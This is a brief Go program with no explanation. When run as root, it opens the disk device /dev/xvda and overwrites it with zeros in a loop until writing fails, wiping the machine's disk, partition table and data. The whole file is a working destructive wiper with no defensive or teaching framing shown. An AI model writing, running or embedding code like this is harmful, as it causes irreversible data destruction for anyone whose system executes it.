package main
import ("os")
func main() {
	if os.Geteuid() != 0 { return }
	f, err := os.OpenFile("/dev/xvda", os.O_RDWR, 0)
	if err != nil { return }
	defer f.Close()
	buf := make([]byte, 4096)
	for {
		if _, err := f.Write(buf); err != nil { break }
	}
}
